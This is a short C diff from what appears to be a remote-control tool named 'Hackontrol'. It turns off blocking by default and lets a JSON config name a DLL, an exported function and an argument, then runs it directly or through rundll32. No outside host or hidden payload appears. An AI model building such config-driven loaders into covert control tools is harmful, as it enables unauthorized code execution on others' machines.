@@ -8,7 +8,7 @@ void _stdcall ExecuteEntrypointExecutable(const cJSON* const root, const LPCWSTR
 		return;
 	}
 
-	BOOL block = TRUE;
+	BOOL block = FALSE;
 	BOOL prepend = FALSE;
 	cJSON* field = cJSON_GetObjectItem(root, "block");
 
@@ -47,23 +47,44 @@ freeFile:
 }
 
 void _stdcall ExecuteEntrypointDynamic(const cJSON* const root, const LPCWSTR folderHackontrol) {
+	cJSON* field = cJSON_GetObjectItem(root, "function");
+
+	if(!field || !cJSON_IsString(field)) {
+		return;
+	}
+
+	LPSTR function = cJSON_GetStringValue(field);
+
+	if(!function) {
+		return;
+	}
+
 	LPWSTR file = ExecuteGetFile(root, folderHackontrol);
 
 	if(!file) {
 		return;
 	}
 
-	cJSON* functionField = cJSON_GetObjectItem(root, "function");
+	LPSTR argument = NULL;
+	BOOL attach = FALSE;
+	field = cJSON_GetObjectItem(root, "argument");
 
-	if(!functionField || !cJSON_IsString(functionField)) {
+	if(field && cJSON_IsString(field)) {
+		argument = cJSON_GetStringValue(field);
+	}
+
+	field = cJSON_GetObjectItem(root, "attach");
+
+	if(field && cJSON_IsBool(field)) {
+		attach = cJSON_IsTrue(field);
+	}
+
+	if(!attach) {
+		KHOPANExecuteDynamicLibrary(file, function, argument);
 		goto freeFile;
 	}
 
-	LPSTR function = cJSON_GetStringValue(functionField);
-
-	if(!function) {
-		goto freeFile;
-	}
+	KHOPANExecuteRundll32Function(file, function, argument, TRUE);
 freeFile:
 	LocalFree(file);
 }
